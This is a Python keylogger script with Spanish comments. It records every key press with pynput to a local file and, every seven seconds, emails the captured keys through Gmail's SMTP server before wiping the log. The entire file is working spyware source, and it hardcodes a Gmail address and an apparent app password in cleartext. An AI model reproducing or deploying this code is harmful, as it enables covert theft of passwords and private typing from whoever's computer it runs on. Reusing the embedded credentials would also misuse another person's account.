from pynput.keyboard import Listener
import logging
import time
import datetime
import smtplib

# Configuración
destino = r'C:\Users\jemp2\Desktop\Nueva carpeta\python\keylogger\keylogger.txt'
segundos_espera = 7
timeout = time.time() + segundos_espera

# Configurar logging para guardar las teclas presionadas
logging.basicConfig(filename=destino, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Función para verificar si se ha superado el tiempo límite
def TimeOut():
    return time.time() > timeout

# Función para enviar el archivo por correo
def Enviar():
    try:
        with open(destino, 'r+') as f:
            fecha = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            data = f.readlines()  # Lee todas las líneas como una lista
            teclas = []
            # Procesa cada línea para extraer solo la información relevante
            for linea in data:
                if "Tecla presionada" in linea:
                    tecla = linea.split("Tecla presionada: ")[-1].strip()
                    teclas.append(tecla)
                elif "Tecla especial presionada" in linea:
                    tecla = linea.split("Tecla especial presionada: ")[-1].strip()
                    teclas.append(tecla)

            # Convierte la lista en un string para enviarla como correo
            mensaje = f'Mensaje capturado a las: {fecha}\nTeclas registradas:\n{", ".join(teclas)}'
            print(mensaje)
            
            # Llama a la función para enviar el correo
            crearEmail(
                user="yonkia9@gmail.com",
                passw="nntl nsht luzg vzdl",
                recep=["yonkia9@gmail.com"],
                subj="Registro de teclas",
                body=mensaje,
            )
            # Limpia el archivo después de enviar el correo
            f.seek(0)
            f.truncate()
    except Exception as e:
        print(f"Error al enviar el archivo: {e}")


# Función para configurar y enviar el correo
def crearEmail(user, passw, recep, subj, body):
    try:
        mailUser = user
        mailPass = passw
        From = user
        To = recep
        Subject = subj
        Txt = body

        # Formato del correo
        email = f"""\
From: {From}
To: {", ".join(To)}
Subject: {Subject}

{Txt}
"""

        # Configuración del servidor SMTP
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print('Correo enviado con éxito!!')

    except Exception as e:
        print(f"Error al enviar el correo: {e}")

# Función que se ejecuta al presionar una tecla
def on_press(key):
    try:
        logging.info(f'Tecla presionada: {key.char}')
    except AttributeError:
        logging.info(f'Tecla especial presionada: {key}')

# Iniciar el listener de teclado
def iniciar_keylogger():
    global timeout
    with Listener(on_press=on_press) as listener:
        while True:
            # Si se supera el tiempo de espera, enviar el archivo por correo
            if TimeOut():
                Enviar()
                timeout = time.time() + segundos_espera

# Ejecutar el keylogger
if __name__ == "__main__":
    iniciar_keylogger()
